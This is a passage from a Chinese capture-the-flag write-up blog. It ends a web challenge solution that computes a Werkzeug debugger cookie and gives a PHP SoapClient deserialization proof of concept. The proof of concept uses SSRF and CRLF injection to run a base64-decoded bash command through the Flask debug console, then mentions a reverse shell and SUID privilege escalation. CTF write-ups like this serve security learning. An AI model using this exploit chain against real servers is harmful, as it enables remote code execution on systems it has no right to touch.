+<span class="nb">print</span><span class="p">(</span><span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">rv</span><span class="si">}</span><span class="s2"> added salt&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="s2">&#34;replace&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">12</span><span class="p">])</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">cookie_name</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://tuchuang.huamang.xyz/img/image-20230619132741322.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230619132741322"
+	
+	
+></p>
+<p>最后打SSRF+CRLF即可</p>
+<blockquote>
+<p>这里也有坑点，payload中不能有url编码，不然php这里不能反序列化，很难受，而payload也不能有空格，不然flask那边会报400</p>
+</blockquote>
+<p>最后poc</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nv">$class</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">SoapClient</span><span class="p">(</span><span class="k">null</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
+    <span class="s1">&#39;location&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;http://127.0.0.1:5000/console?__debugger__=yes&amp;cmd=__import__(&#34;os&#34;).popen(&#34;echo${IFS}\&#34;base64数据\&#34;|base64${IFS}-d|bash&#34;).read()&amp;frm=0&amp;s=DhOJxtvMXCtezvKtqaK9&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;user_agent&#39;</span><span class="o">=&gt;</span><span class="s2">&#34;Huamang</span><span class="se">\r\n</span><span class="s2">Cookie: __wzdb2a60e2b19822632a67c=1687308743|11b8517fb9fb&#34;</span><span class="p">,</span>
+    <span class="s1">&#39;uri&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;http://127.0.0.1:5000/&#34;</span><span class="p">)));</span>
+<span class="nv">$arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;properties&#39;</span> <span class="o">=&gt;</span> <span class="nv">$class</span> <span class="p">);</span>
+<span class="nv">$payload</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$payload</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>反弹shell到手后需要提权，简单suid即可</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230619132947883.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230619132947883"
+	
+	
+></p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20230619132959910.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230619132959910"
+	
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/%E9%A5%B6%E6%B4%BE%E6%9D%AF/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[2023饶派杯XCTF车联网挑战赛] WP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/hitcon2022/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[Hitcon2022] Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/xyb2022/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[2022祥云杯] wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/qwb2022/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[2022强网杯] WP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/typhoonconctf2022/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">[TyphoonCon CTF 2022] WP</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2023 Huamang
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        <span id="busuanzi_container_page_pv"> 阅读量 <span id="busuanzi_value_page_pv"></span> 次 </span>
+        <br>
+        
+        <span class="icp"><a href="https://beian.miit.gov.cn/" target="_blank">赣ICP备2021001334号</a></span>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+    </body>
+</html>
